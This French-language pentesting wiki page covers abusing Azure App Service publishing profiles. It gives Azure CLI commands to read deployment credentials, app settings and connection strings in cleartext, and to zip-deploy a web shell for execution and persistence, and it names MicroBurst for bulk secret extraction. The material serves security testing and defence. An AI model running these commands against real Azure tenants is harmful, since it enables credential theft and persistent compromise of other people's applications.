---
title: "Identifiants de déploiement : les profils de publication qui poussent du code"
order: 2
description: "Récupérer les profils de publication et identifiants de déploiement App Service pour pousser du code et lire la configuration."
keywords:
  - deployment credentials
  - publishing profile
  - App Service
  - code push
  - config
---

# Identifiants de déploiement

Les **identifiants de publication** App Service authentifient les déploiements de code via msdeploy, FTP et le site SCM. Avec `Microsoft.Web/sites/publishxml/action` (inclus dans Contributor), le profil de publication est lisible et livre le nom d'utilisateur, le mot de passe et les endpoints de déploiement, ce qui suffit à pousser un web shell et à lire la configuration de l'application.

## Lire le profil de publication

```bash
# full profile with msdeploy/FTP credentials
az webapp deployment list-publishing-profiles -g <rg> -n <app> --xml
# the SCM site-level credentials
az webapp deployment list-publishing-credentials -g <rg> -n <app> \
  --query '{user:publishingUserName,pass:publishingPassword}'
# app settings and connection strings in cleartext
az webapp config appsettings list -g <rg> -n <app>
az webapp config connection-string list -g <rg> -n <app>
```

## Déployer un web shell

```bash
# zip-deploy a handler that runs in the app context
az webapp deploy -g <rg> -n <app> --src-path shell.zip --type zip
```

## Notes d'exploitation

- Le mot de passe de publication s'authentifie directement auprès de [Kudu/SCM](kudu-and-scm.md) : un profil récupéré est donc un shell.
- `appsettings`/`connection-string list` renvoient les secrets en clair, sauf si des références Key Vault sont utilisées ; et même dans ce cas, la cible de la référence est divulguée.
- Un paquet poussé persiste jusqu'au redéploiement : il s'agit donc à la fois d'exécution et de persistance.

## Outils

- **Azure CLI** (`az webapp deployment`, `az webapp config`, `az webapp deploy`).
- **MicroBurst** (`Get-AzPasswords`) : extraction en masse des profils de publication et des paramètres d'application.

## Références

- [HackTricks Cloud: Azure App Service deployment](https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/index.html)
- [Microsoft: deployment credentials for App Service](https://learn.microsoft.com/azure/app-service/deploy-configure-credentials)
- [NetSPI: MicroBurst](https://github.com/NetSPI/MicroBurst)
